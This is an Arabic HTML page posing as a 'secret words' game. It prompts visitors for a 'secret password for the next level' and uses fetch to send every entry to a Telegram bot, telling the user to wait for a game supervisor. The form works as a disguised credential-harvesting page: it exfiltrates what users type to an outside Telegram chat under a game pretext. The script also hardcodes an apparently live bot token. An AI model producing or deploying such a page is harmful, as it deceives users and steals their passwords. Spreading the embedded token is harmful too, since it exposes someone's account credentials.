<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لعبة الكلمات السرية</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .game-container {
            background-color: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            text-align: center;
        }
        input {
            display: block;
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 3px;
        }
        button {
            background-color: #4CAF50;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>
    <div class="game-container">
        <h1>لعبة الكلمات السرية</h1>
        <p>أدخل كلمة المرور السرية للمستوى التالي:</p>
        <form id="gameForm">
            <input type="text" id="secretWord" placeholder="الكلمة السرية" required>
            <button type="submit">تحقق</button>
        </form>
        <p id="result"></p>
    </div>
    <script>
        const BOT_TOKEN = '6427937623:AAEXzSsiAIy67dxzI0gqR9Dyuc59iGFSfmM'; // استبدل هذا بتوكن البوت الخاص بك

        document.getElementById('gameForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var secretWord = document.getElementById('secretWord').value;
            var result = document.getElementById('result');
            
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: 'YOUR_CHAT_ID', // استبدل هذا بمعرف الدردشة الخاص بك لاحقًا
                    text: 'كلمة سرية جديدة: ' + secretWord
                }),
            })
            .then(response => response.json())
            .then(data => {
                result.textContent = "تم إرسال الكلمة! انتظر الرد من المشرف على اللعبة.";
            })
            .catch((error) => {
                console.error('Error:', error);
                result.textContent = "حدث خطأ أثناء إرسال الكلمة. حاول مرة أخرى.";
            });
        });
    </script>
</body>
</html>
